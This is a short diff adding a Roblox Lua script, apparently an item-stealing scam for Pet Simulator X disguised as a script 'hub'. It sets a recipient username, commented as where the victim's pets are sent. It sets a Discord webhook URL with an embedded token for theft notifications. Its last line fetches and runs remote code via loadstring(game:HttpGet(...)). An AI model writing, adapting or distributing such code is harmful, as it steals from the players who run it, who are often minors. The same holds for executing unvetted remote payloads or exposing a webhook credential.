@@ -1,0 +1,5 @@
+_G.Username "patrykkacp" --This is where you put where you want the pets to go
+_G.HubName "Pet Simulator X Destroyer" --Put any name here of any script
+_G.WebhookUrl "https://discord.com/api/webhooks/1150364146127351868/vD4-Kq41LUvxtYaJzr2nZgVAtaCYD-uECfaurkUPhjI0M_NqoOui0cSdifQBU96ZiT03" --This is where the notifications get sent
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
